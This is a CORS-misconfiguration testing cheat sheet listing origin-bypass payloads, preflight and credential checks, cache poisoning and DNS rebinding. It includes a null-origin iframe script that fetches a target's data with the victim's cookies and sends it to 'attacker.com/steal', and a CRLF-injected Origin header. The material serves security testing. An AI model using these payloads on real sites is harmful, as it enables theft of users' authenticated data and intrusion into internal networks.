
# 1. Basic Origin Reflection Test

```yaml
Replace Origin header with:
Origin: https://attacker.com
Origin: attacker.com
Origin: null
Origin: <any-random-domain>
```
**Check if:** Server copies your Origin into `Access-Control-Allow-Origin` header.
# 2. Prefix/ Suffix Bypass

If `example.com` is whitelisted, try:
```yaml
Origin: example.com.attacker.com
Origin: attackerexample.com
Origin: example.com@attacker.com
```

# 3. Special Character Bypasses

```
Origin: https://example_.com  ← Underscore (works in Chrome/Firefox)
Origin: https://example}.com  ← Special chars (works in Safari)
Origin: https://example%2ecom ← URL encoded dot
```

# 4. Subdomain Takeover

If `*.example.com` is allowed:
```json
Find XSS on any subdomain → Bypasses CORS entirely
sub.example.com with XSS can access main.example.com
```

# 5. NULL origin Attack

```javascript
<iframe sandbox="allow-scripts allow-forms"
        srcdoc="<script>
          fetch('https://target.com/data', {credentials: 'include'})
          .then(r => r.text())
          .then(d => location='https://attacker.com/steal?data='+d)
        </script>">
</iframe>
```

# 6. Pre-flight Bypass Checks
Send these unusual requests:
```json
OPTIONS /data HTTP/1.1
Origin: https://attacker.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Attacker-Header
```
**Check if:** Server allows unexpected methods/headers.

# 7. Credentials Test

```javascript
fetch('https://target.com/api', {
  credentials: 'include',
  headers: { 'Origin': 'https://attacker.com' }
})
```
**Check if:** Server responds with `Access-Control-Allow-Credentials: true`

# 8.Internal Network Bypass

```json
Target local/private IPs:
Origin: http://192.168.1.1
Origin: http://10.0.0.1
Origin: http://0.0.0.0  ← Linux bypass
Origin: http://127.0.0.1.nip.io ← DNS rebinding
```

# 9. Port Bypass
If `example.com:3000` is blocked, try:
```json
Origin: example.com:80
Origin: example.com  ← No port specified
```

# 10. HTTP/HTTPS Protocol Mix

```json
If https://example.com is allowed, try:
Origin: http://example.com  ← Downgrade attack
```

# 11. Wildcard Abuse

If `Access-Control-Allow-Origin: *` exists:

```json
Try with credentials
Some servers misconfigure: * + credentials
```

# 12. Cache Poisoning

```json
Inject: Origin: victim.com\r\nAccess-Control-Allow-Origin: attacker.com
Poison cache → Future requests get attacker's CORS policy
```

# 13. JSONP Fallback

```json
If CORS blocks, try: ?callback=evil
Many APIs support JSONP as legacy fallback
```

# 14. DNS Rebinding Attack

```json
1. Set short TTL DNS record: A → attacker-IP
2. Victim visits your page
3. Change DNS: A → 127.0.0.1
4. When TTL expires, victim's browser hits localhost
```

# 15. Service Worker Bypass

```json
// Register service worker on vulnerable subdomain
// Then make cross-origin requests from worker
```

